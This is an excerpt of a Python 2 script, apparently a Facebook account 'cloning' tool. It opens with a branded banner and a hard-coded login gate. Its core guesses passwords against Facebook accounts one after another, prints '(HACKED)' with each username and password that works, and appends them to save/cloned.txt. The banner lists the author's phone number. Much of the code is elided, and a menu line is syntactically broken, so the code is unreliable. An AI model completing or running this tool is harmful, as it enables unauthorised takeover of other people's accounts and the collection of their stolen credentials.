# Ustad# Malyk# Thuglife# MalykSuleman# Gamz#!/usr/bin/python2
#coding=utf-8
...
\033[1;92m---------------------MalykSuleman---------------------
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mThe Credit For This Code Goes To Malyk..
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91mDeveloper
                     MALYK SULEMAN
\033[1;94mFacebook
                     MALYK SULEMAN
\033[1;91mYoutube
                     Khibaz Ahmad Oficial
\033[1;93mGithub
                     MalykSuleman007
\033[1;92mWhatsapp
                      03084820242
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mH4CKING I5 N0T 4 CRIM3 ITX MY PR0F355I0N..
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••                
\033[1;92m--------------------MALYK----------------------
"""
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:MalykSuleman
	    time.sleep(2)
            loop = 'false'
        else:
...
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;91m[1]  ST4RT CL0NING With Malyk'
    time.sleep(0.10)
    print '\x1b[1;92m[2] Malyk FB ACCOUNT'
    time.sleep(0.10)
    print '\x1b[1;95m[3] MORE INFO'
    time.sleep(0.10)
    print '\x1b[1;96m[4] Tracer'
    time.sleep(0.10)
    print '\x1b[1;97m[5] Cloning Error'
    time.sleep(0.10)
    print '\x1b[1;91m[6] Malyk Facebook 
    time.sleep(0.10)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;93m(HACKED)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(HACKED)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(HACKED)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(HACKED)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mMalyk
\033[1;95myoutube\033[1;97mhttps://www.youtube.com/channel/UCfjMVsbk0uJwY1bO3Ns38lw"""
